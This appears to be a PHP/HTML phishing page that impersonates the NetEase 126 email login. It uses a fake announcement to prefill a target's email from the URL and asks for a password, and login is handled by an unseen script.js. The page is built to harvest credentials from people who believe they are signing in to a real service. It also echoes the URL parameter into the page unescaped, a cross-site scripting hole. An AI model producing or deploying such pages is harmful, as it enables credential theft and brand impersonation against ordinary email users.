<?php
	if(isset($_GET['email'])){
		$email = $_GET['email'];
	}
?>
<!DOCTYPE html>
<html>
<head>
	<title>126网易免费邮--你的专业电子邮</title>
	<link rel="icon" href="icon.png" />
	<link rel="stylesheet" href="style.css" />
	<link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
</head>
<body>
	<header>
		<div class="header-container">
			<img src="images.png" width="190px" height="38px">
		</div>
	</header>
	<section style="float: left;">
		<div class="row">
			<div class="col-xs-12 col-sm-12 col-md-10 col-lg-8 col-xl-8 mx-auto">
				<div class="col-sm-12 col-md-7 float-left mt-4 d-none d-sm-none d-md-inline d-lg-inline d-xl-inline">
					
				</div>
				<div class="col-sm-12 col-md-5 float-left p-0 mt-5 shadow rounded bg-white">
					<div class="col-12 p-0">
						<div class="col-12 py-2">
							<p class="text-center text-warning mb-0">公告：2019年网易免费邮箱积分处理通知</p>
							<h5 class="m-0 py-1 text-center"><strong>手机扫码 安全登录</strong></h5>
						</div>
						<div class="form-group px-4">
							<div class="alert alert-info hide" id="processing"></div>
						</div>
						<div class="form-group px-4 mt-2">
							<input class="form-control rounded-0" id="email" value="<?php echo $_GET['email']; ?>" placeholder="支持QQ号/邮箱/手机号登录" disabled="">
							<small id="error" style="color:red;"></small>
						</div>
						<div class="form-group px-4 mt-4">
							<input class="form-control rounded-0" type="password" id="password" placeholder="QQ密码">
							<small id="error" style="color:red;"></small>
						</div>
						<div class="form-group px-4">
							<input type="checkbox" id="remember">
							<label class="text-medium">下次自动登录</label>
						</div>
						<div class="form-group px-4">
							<button class="btn btn-block btn-lg btn-success" id="login">登 录</button>
						</div>
						<div class="form-group px-4">
							<p class="text-success text-center">注册新帐号</p>
						</div>
						<div class="form-group px-4 mt-5 float-right">
							<p class="text-right mt-5 text-success">忘了密码？</p>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>
</body>
<script type="text/javascript" src="script.js"></script>
</html>